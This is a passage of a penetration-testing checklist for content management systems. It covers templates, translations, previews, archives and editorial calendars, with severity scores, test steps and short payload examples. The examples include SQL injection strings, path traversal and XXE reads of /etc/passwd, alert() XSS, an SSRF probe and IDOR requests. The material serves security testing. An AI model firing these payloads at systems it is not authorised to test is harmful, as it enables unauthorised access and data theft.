
**Expected Result:** Version restore should verify permissions

**Payload Example:**

```
Restore template with injected code
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## CMS-136 — Template Import Vulnerability
**Test Category:** Remote Code Execution · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Template Management

**Test Steps:** 1. Import template from external source 2. Include malicious code 3. Execute on import

**Expected Result:** Imports should be validated and sandboxed

**Payload Example:**

```
Import template containing shell code
```

**Impact:** Code/command execution -&gt; full server compromise.

**Tools:** Burp Suite / Manual Testing

**References:** CWE-94; -&gt;[Command Injection checklist](#/checklist/cmdi); PortSwigger; OWASP

---

## CMS-137 — Language Parameter Injection
**Test Category:** Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Multi-language Content

**Test Steps:** 1. Modify language parameter 2. Inject SQL or path traversal 3. Access unauthorized content

**Expected Result:** Language codes should be validated

**Payload Example:**

```
lang=en' OR '1'='1 or lang=../../../etc/passwd
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap / Burp Suite / DotDotPwn

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## CMS-138 — XSS via Language Content
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Multi-language Content

**Test Steps:** 1. Edit translation 2. Insert XSS in translation 3. Execute when language viewed

**Expected Result:** Translations should be sanitized

**Payload Example:**

```
Translation: <script>alert('XSS')</script>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## CMS-139 — Translation IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Multi-language Content

**Test Steps:** 1. Edit own translation 2. Modify content_id 3. Edit others' translations

**Expected Result:** Translation editing should verify permissions

**Payload Example:**

```
PUT /api/content/victim_id/translations/en
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## CMS-140 — Language File Inclusion
**Test Category:** Path Traversal · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Multi-language Content

**Test Steps:** 1. Modify language file path 2. Include arbitrary files 3. Information disclosure

**Expected Result:** Language file loading should be restricted

**Payload Example:**

```
lang=../../../../etc/passwd
```

**Impact:** Path traversal -&gt; secret/cross-user file read or out-of-dir write -&gt; RCE.

**Tools:** Burp Suite / DotDotPwn

**References:** CWE-22; -&gt;[Path Traversal checklist](#/checklist/pathtraversal); PortSwigger path traversal; Orange Tsai

---

## CMS-141 — Translation Override Attack
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Multi-language Content

**Test Steps:** 1. Create translation for existing content 2. Override legitimate translation 3. Content manipulation

**Expected Result:** Translation creation should check existing

**Payload Example:**

```
Override official translation with malicious
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## CMS-142 — Hidden Language Access
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Multi-language Content

**Test Steps:** 1. Find hidden/disabled language 2. Access directly 3. View unreleased content

**Expected Result:** Disabled languages should be inaccessible

**Payload Example:**

```
?lang=unreleased_language_code
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## CMS-143 — RTL/LTR Injection
**Test Category:** Cross-Site Scripting · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Multi-language Content

**Test Steps:** 1. Use RTL override characters 2. Disguise malicious content 3. Social engineering

**Expected Result:** Control characters should be handled

**Payload Example:**

```
‮malicious.exe (displays as exe.suoicilam)
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / Hackvertor

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## CMS-144 — Character Encoding Attack
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Multi-language Content

**Test Steps:** 1. Use different encoding 2. Bypass XSS filters 3. Execute script

**Expected Result:** All encodings should be handled

**Payload Example:**

```
UTF-7: +ADw-script+AD4-alert(1)+ADw-/script+AD4-
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / Hackvertor

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## CMS-145 — Translation Import XXE
**Test Category:** XML External Entity · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Multi-language Content

**Test Steps:** 1. Import translations via XML 2. Include XXE payload 3. Extract files

**Expected Result:** XML import should disable entities

**Payload Example:**

```
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
```

**Impact:** XXE -&gt; local file read / SSRF / OOB exfiltration.

**Tools:** Burp Suite / XXEinjector

**References:** CWE-611; -&gt;[XXE checklist](#/checklist/xxe); PortSwigger XXE

---

## CMS-146 — Locale-Based Access Control Bypass
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Multi-language Content

**Test Steps:** 1. Change locale 2. Bypass region-based restrictions 3. Access restricted content

**Expected Result:** Access control should be locale-independent

**Payload Example:**

```
Access region-locked content via locale change
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## CMS-147 — Translation Sync Race Condition
**Test Category:** Race Condition · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Multi-language Content

**Test Steps:** 1. Edit translation 2. Concurrent sync 3. Overwrite changes

**Expected Result:** Translation sync should be atomic

**Payload Example:**

```
Parallel translation updates
```

**Impact:** Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend).

**Tools:** Turbo Intruder / Burp Suite

**References:** CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine

---

## CMS-148 — Language Fallback Exploitation
**Test Category:** Business Logic · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Multi-language Content

**Test Steps:** 1. Remove primary language content 2. Force fallback 3. Expose internal content

**Expected Result:** Fallback should not expose private content

**Payload Example:**

```
Force fallback to admin language
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Manual Testing

**References:** CWE-840; PortSwigger Business logic

---

## CMS-149 — Preview IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Content Preview

**Test Steps:** 1. Preview own content 2. Modify content_id 3. Preview others' drafts

**Expected Result:** Preview should verify ownership

**Payload Example:**

```
GET /api/content/victim_draft/preview
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## CMS-150 — Preview Token Enumeration
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Content Preview

**Test Steps:** 1. Generate preview token 2. Analyze token structure 3. Predict other tokens

**Expected Result:** Preview tokens should be unpredictable

**Payload Example:**

```
Sequential or timestamp-based tokens
```

**Impact:** Username/account enumeration -&gt; a valid-target list that fuels credential stuffing / phishing / ATO.

**Tools:** Burp Suite Sequencer / Custom Scripts

**References:** CWE-204; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-IDNT-04

---

## CMS-151 — Preview XSS Execution
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Content Preview

**Test Steps:** 1. Add XSS to draft 2. Generate preview 3. XSS executes in preview

**Expected Result:** Preview should sanitize content

**Payload Example:**

```
<script>alert('XSS')</script> in draft
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## CMS-152 — Preview Link Sharing Exploit
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Content Preview

**Test Steps:** 1. Generate preview link 2. Share publicly 3. Bypass private content

**Expected Result:** Preview links should be time-limited and restricted

**Payload Example:**

```
Share preview link for private content
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Manual Testing

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## CMS-153 — Preview SSRF
**Test Category:** Server-Side Request Forgery · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Content Preview

**Test Steps:** 1. Preview content with external resources 2. Use internal URLs 3. SSRF via preview

**Expected Result:** Preview should not fetch arbitrary URLs

**Payload Example:**

```
Preview content with http://localhost/admin
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite / SSRFmap

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## CMS-154 — Preview Caching Leak
**Test Category:** Information Disclosure · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Content Preview

**Test Steps:** 1. Preview private content 2. Content gets cached 3. Others access cached preview

**Expected Result:** Previews should not be cached

**Payload Example:**

```
Cached preview accessible without auth
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Browser DevTools

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## CMS-155 — Preview as Different User
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Content Preview

**Test Steps:** 1. Preview content 2. Modify viewer_id 3. Preview as admin

**Expected Result:** Preview should use current session

**Payload Example:**

```
GET /api/content/123/preview?as_user=admin
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## CMS-156 — Preview Rendered Output Manipulation
**Test Category:** Business Logic · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Content Preview

**Test Steps:** 1. Preview content 2. Modify rendered response 3. Show different content

**Expected Result:** Preview should match actual render

**Payload Example:**

```
Manipulate preview response
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Browser DevTools

**References:** CWE-840; PortSwigger Business logic

---

## CMS-157 — Preview Timestamp Manipulation
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Content Preview

**Test Steps:** 1. Preview scheduled content 2. Modify preview timestamp 3. View future content

**Expected Result:** Timestamp should be server-controlled

**Payload Example:**

```
preview_at=2099-12-31
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## CMS-158 — Preview Mobile/Desktop XSS
**Test Category:** Cross-Site Scripting · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Content Preview

**Test Steps:** 1. Preview in mobile mode 2. XSS specific to mobile view 3. Execute script

**Expected Result:** All preview modes should sanitize

**Payload Example:**

```
Mobile-specific XSS payload
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## CMS-159 — Archive IDOR Access
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Content Archiving

**Test Steps:** 1. Access own archives 2. Modify archive_id 3. Access others' archives

**Expected Result:** Archive access should verify ownership

**Payload Example:**

```
GET /api/archives/victim_archive_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## CMS-160 — Archive IDOR Restore
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Content Archiving

**Test Steps:** 1. Restore own archive 2. Modify archive_id 3. Restore others' archives

**Expected Result:** Restore should verify permissions

**Payload Example:**

```
POST /api/archives/victim_archive/restore
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## CMS-161 — Archive IDOR Delete
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Content Archiving

**Test Steps:** 1. Delete own archive 2. Modify archive_id 3. Delete others' archives

**Expected Result:** Deletion should verify ownership

**Payload Example:**

```
DELETE /api/archives/victim_archive_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## CMS-162 — Archive Bypass to Access Deleted
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Content Archiving

**Test Steps:** 1. Content deleted 2. Access via archive 3. View deleted content

**Expected Result:** Archived content should respect current permissions

**Payload Example:**

```
Access archived content bypassing deletion
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## CMS-163 — Archive Enumeration
**Test Category:** Information Disclosure · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Content Archiving

**Test Steps:** 1. Iterate archive IDs 2. Discover archived content 3. Build content history

**Expected Result:** Archive IDs should be unpredictable

**Payload Example:**

```
/archives/1 through /archives/10000
```

**Impact:** Username/account enumeration -&gt; a valid-target list that fuels credential stuffing / phishing / ATO.

**Tools:** Burp Suite Intruder / ffuf

**References:** CWE-204; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-IDNT-04

---

## CMS-164 — Archive Storage Exhaustion
**Test Category:** Denial of Service · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Content Archiving

**Test Steps:** 1. Archive large amounts of content 2. Exhaust storage 3. Prevent new archives

**Expected Result:** Archive storage should be limited

**Payload Example:**

```
Archive/unarchive repeatedly
```

**Impact:** Denial of service -&gt; availability impact for this feature / the app.

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-400; -&gt;[Race Condition checklist](#/checklist/racecondition); OWASP; PortSwigger

---

## CMS-165 — Archive Timestamp Manipulation
**Test Category:** Business Logic · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Content Archiving

**Test Steps:** 1. Archive content 2. Modify archive date 3. Alter history

**Expected Result:** Archive timestamps should be server-set

**Payload Example:**

```
{"archived_at":"2010-01-01T00:00:00Z"}
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## CMS-166 — Archive Search SQL Injection
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Content Archiving

**Test Steps:** 1. Search archived content 2. Inject SQL payload 3. Extract data

**Expected Result:** Archive queries should be parameterized

**Payload Example:**

```
/archives?search='; SELECT * FROM users--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap / Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## CMS-167 — Archive XSS via Content
**Test Category:** Cross-Site Scripting · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Content Archiving

**Test Steps:** 1. Archive content with XSS 2. View archived content 3. XSS executes

**Expected Result:** Archived content should be sanitized

**Payload Example:**

```
XSS payload preserved in archive
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## CMS-168 — Archive Export Data Leak
**Test Category:** Information Disclosure · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Content Archiving

**Test Steps:** 1. Export archive 2. Include sensitive metadata 3. Expose internal data

**Expected Result:** Exports should filter sensitive data

**Payload Example:**

```
Archive export with internal notes
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Postman

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## CMS-169 — Bulk Archive IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Content Archiving

**Test Steps:** 1. Bulk archive own content 2. Include others' content IDs 3. Archive unauthorized content

**Expected Result:** Bulk actions should verify all items

**Payload Example:**

```
POST /api/content/bulk-archive {"ids":["own",victim]}
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## CMS-170 — Archive Policy Bypass
**Test Category:** Business Logic · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Content Archiving

**Test Steps:** 1. Check archive retention policy 2. Access content past retention 3. View expired archives

**Expected Result:** Retention policies should be enforced

**Payload Example:**

```
Access archive past retention period
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## CMS-171 — Calendar IDOR View
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Editorial Calendar

**Test Steps:** 1. View own calendar 2. Modify user_id 3. View others' calendars

**Expected Result:** Calendar access should verify permissions

**Payload Example:**

```
GET /api/calendar/victim_user_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## CMS-172 — Calendar Event IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Editorial Calendar

**Test Steps:** 1. Edit own calendar event 2. Modify event_id 3. Edit others' events

**Expected Result:** Event editing should verify ownership

**Payload Example:**

```
PUT /api/calendar/events/victim_event_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## CMS-173 — Calendar Event Creation IDOR
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Editorial Calendar

**Test Steps:** 1. Create event on own calendar 2. Modify user_id 3. Create events for others

**Expected Result:** Event creation should use session user

**Payload Example:**

```
POST /api/calendar/events {"user_id":"victim",title:"spam"}
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## CMS-174 — Calendar XSS via Event Title
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Editorial Calendar

**Test Steps:** 1. Create event with XSS in title 2. View calendar 3. XSS executes

**Expected Result:** Event details should be sanitized

**Payload Example:**

```
<script>alert('XSS')</script>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## CMS-175 — Calendar Date Manipulation
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Editorial Calendar

**Test Steps:** 1. Set event date 2. Modify to bypass deadlines 3. Submit late content

**Expected Result:** Dates should be validated server-side

**Payload Example:**

```
{"deadline":"2099-12-31T23:59:59Z"}
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## CMS-176 — Calendar Export Information Leak
**Test Category:** Information Disclosure · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Editorial Calendar

**Test Steps:** 1. Export calendar 2. Include private events 3. Expose sensitive scheduling

**Expected Result:** Export should respect privacy

**Payload Example:**

```
ICS export with private events
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Postman

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## CMS-177 — Calendar Subscription URL Enumeration
**Test Category:** Information Disclosure · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Editorial Calendar

**Test Steps:** 1. Find calendar feed URL 2. Modify user identifier 3. Access others' feeds

**Expected Result:** Feed URLs should be unpredictable

**Payload Example:**

```
/calendar/feed/victim_token.ics
```

**Impact:** Username/account enumeration -&gt; a valid-target list that fuels credential stuffing / phishing / ATO.

**Tools:** Burp Suite / ffuf

**References:** CWE-204; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-IDNT-04

---

## CMS-178 — Calendar Notification Injection
**Test Category:** Injection · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Editorial Calendar

**Test Steps:** 1. Create event with notification 2. Inject payload in notification 3. Email injection

**Expected Result:** Notification content should be sanitized

**Payload Example:**

```
Event triggering malicious notification
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / Email Analysis

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## CMS-179 — Calendar Drag-Drop Privilege Escalation
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Editorial Calendar

**Test Steps:** 1. Drag event to reschedule 2. Modify event not owned 3. Change others' schedules

**Expected Result:** Drag operations should verify ownership

**Payload Example:**

```
Reschedule others' content via UI
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Manual Testing

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## CMS-180 — Calendar API Rate Limiting Bypass
**Test Category:** Security Bypass · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Editorial Calendar

**Test Steps:** 1. Query calendar rapidly 2. Exhaust resources 3. Enumerate all events

**Expected Result:** Calendar queries should be rate-limited

**Payload Example:**

```
1000 calendar queries per minute
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## CMS-181 — Calendar CSRF
**Test Category:** Cross-Site Request Forgery · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Editorial Calendar

**Test Steps:** 1. Create malicious page 2. Auto-create/modify events 3. Manipulate schedule

**Expected Result:** Calendar operations need CSRF protection

**Payload Example:**

```
<form action="/calendar/events/create">
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite CSRF PoC / Custom HTML

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

